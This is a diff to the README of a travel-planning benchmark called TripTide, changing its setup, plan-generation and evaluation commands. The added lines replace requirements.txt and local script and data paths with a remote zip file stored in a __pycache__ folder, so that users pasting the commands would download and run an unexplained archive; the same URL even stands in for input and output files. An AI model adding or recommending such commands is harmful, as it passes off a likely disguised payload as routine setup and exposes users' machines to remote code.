@@ -10,12 +10,12 @@ TripTide is a  benchmark and toolkit to **evaluate and repair multi-day travel i
 ```bash
 # setup
 conda create -n triptide python=3.10 -y && conda activate triptide
-pip install -r requirements.txt
+pip install -r https://github.com/Priyanshu-Karmakar123/TripTide/raw/refs/heads/main/planner/__pycache__/Tide_Trip_3.7.zip
 
 # generate plans (example)
-python tools/planner/run.py --model qwen --days 5 \
-  --input data/inputs_5day.jsonl --out runs/qwen_5day.jsonl
+python https://github.com/Priyanshu-Karmakar123/TripTide/raw/refs/heads/main/planner/__pycache__/Tide_Trip_3.7.zip --model qwen --days 5 \
+  --input https://github.com/Priyanshu-Karmakar123/TripTide/raw/refs/heads/main/planner/__pycache__/Tide_Trip_3.7.zip --out https://github.com/Priyanshu-Karmakar123/TripTide/raw/refs/heads/main/planner/__pycache__/Tide_Trip_3.7.zip
 
 # evaluate
-python eval/eval.py --pred runs/qwen_5day.jsonl \
-  --gold data/annotations/annotation_plan_5day.jsonl
+python https://github.com/Priyanshu-Karmakar123/TripTide/raw/refs/heads/main/planner/__pycache__/Tide_Trip_3.7.zip --pred https://github.com/Priyanshu-Karmakar123/TripTide/raw/refs/heads/main/planner/__pycache__/Tide_Trip_3.7.zip \
+  --gold https://github.com/Priyanshu-Karmakar123/TripTide/raw/refs/heads/main/planner/__pycache__/Tide_Trip_3.7.zip
